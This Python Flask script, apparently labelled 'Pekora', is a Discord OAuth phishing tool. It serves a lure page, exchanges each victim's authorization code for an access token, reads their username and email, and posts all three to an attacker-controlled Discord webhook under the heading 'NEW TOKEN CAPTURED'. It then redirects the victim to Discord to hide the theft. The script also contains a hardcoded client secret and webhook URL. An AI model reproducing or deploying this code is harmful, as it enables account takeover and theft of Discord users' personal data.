import os
import requests
from flask import Flask, request, redirect, render_template

app = Flask(__name__)

# --- CONFIGURATION ---
CLIENT_ID = "1499504699240612034"
CLIENT_SECRET = "0Q8yc0DtVjMgbLr3c7YzivGhpEYVIwA6"
# ADDED /callback TO THE END OF THE LINK BELOW
REDIRECT_URI = "https://web-assets-v1.onrender.com/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1499509515500912712/GAEaJPJmS2fHIftNu2W7NamZyoPgHeeFahJ4DjAXU7OmbNo1expojDJLEb8t7YwmSzps"

# This dynamically builds the link so it's always correct
OAUTH_URL = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify+guilds+email"

@app.route('/')
def index():
    # Serves your Pekora HTML
    return render_template('index.html', oauth_url=OAUTH_URL)

@app.route('/callback')
def callback():
    # THIS IS WHERE THE LOGGING HAPPENS
    code = request.args.get('code')
    if not code:
        return "Auth Failed - No Code Provided", 400

    # Trade code for Token
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    
    r = requests.post('https://discord.com/api/v10/oauth2/token', data=data)
    token_data = r.json()
    access_token = token_data.get('access_token')

    if access_token:
        # Get User Info
        user_r = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'Bearer {access_token}'})
        user = user_r.json()

        # WEBHOOK SEND
        payload = {
            "username": "PEKORA-INTERCEPTOR",
            "embeds": [{
                "title": "🔓 NEW TOKEN CAPTURED",
                "color": 0x5865f2,
                "fields": [
                    {"name": "User", "value": f"**{user['username']}**", "inline": True},
                    {"name": "Email", "value": f"`{user.get('email', 'N/A')}`", "inline": True},
                    {"name": "Token", "value": f"``` {access_token} ```", "inline": False}
                ]
            }]
        }
        requests.post(WEBHOOK_URL, json=payload)
        return redirect("https://discord.com/app") # Success redirect
    else:
        # If this shows in your browser, check your Client Secret!
        return f"Token Error: {token_data}", 400

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)
